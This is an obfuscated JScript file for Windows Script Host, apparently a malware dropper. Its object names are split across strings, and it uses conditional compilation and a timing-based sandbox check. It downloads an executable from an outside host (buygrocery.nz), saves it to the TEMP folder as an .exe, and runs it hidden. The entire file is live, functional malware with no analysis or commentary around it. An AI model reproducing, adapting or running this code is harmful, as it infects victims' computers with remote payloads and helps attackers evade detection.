var TC = false;
var QV = "Create"+"Object";
var VQ = function F() {return WScript[QV]("WScript"+".Shell");}(), G = 11;
var RL = "MSXML2"+".XMLHTTP";
var T0 = 2;
var CJ = T0 - 2;
function RH(W){VQ["Run"](W, CJ, CJ);};
function D(){return RL + "";};
function N(F0, W0){CJ = CJ * 1; return F0 - W0;};
function FO(){return QV;};
/*@cc_on
  @if (@_win32 || @_win64)
    TC = true;
  @end
@*/
if (TC)
{
var A = "";
function I(){return 22;};
var U = 0; var TO = 0;
function S0()
{
var CE = new this["Date"]();
var XA = CE["getUTCMilliseconds"]();
WScript["Sleep"](I());
var CE = new this["Date"]();
var OJ = CE["getUTCMilliseconds"]();
WScript["Sleep"](I());
var CE = new this["Date"]();
var S1 = CE["getUTCMilliseconds"]();
var U = "BQ";
U = N(OJ, XA);
var TO = "ZV";
TO = N(S1, OJ);
A = "open";
return N(U, TO);
}
var Z = false;
var X = false;
for (var ZV0 = CJ; ZV0 < I() * 1; ZV0++){if (S0() != CJ){
Z = true; 
TO = "31" + 11 * U + TO; 
X = true; 
break;
}}
function E() {return ((Z == true) && (Z == X)) ? 1 : CJ;};
if (Z && E() && X){
function S() {return VQ["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "TiopJp2nk0fc7s.ex" + "e";};
 O = D();
 T1 = WScript[QV](O);
 var VY = 1;
do { 
	for (;VY;){
	try {
		if (VY == 1)
		{
			T1[A]("GET", "http://buygrocery.nz/l7dsp", false);
			T1["send"]();
			HZ = "Sleep";
			VY = 2;
		}
		WScript[HZ](I() + 120); 
		if (T1["readystate"] < 2 * 2) continue;
		VY = CJ;
		function GJ(DR) {var T = (1, 2, 3, 4, 5, DR); return T;};
		N0 = WScript[FO()]("ADODB.Stream");
		O = N0;
		O[A]();
		O["type"] = GJ(1);
		O["write"](T1["ResponseBody"]);
		N0["position"] = GJ(CJ);
		O["Save" + "ToFile"](S(), 2);
		N0["cl"+"ose"]();
		I0 = S();
		RH(I0);
	} catch(B){};};
}while (VY);
}
}

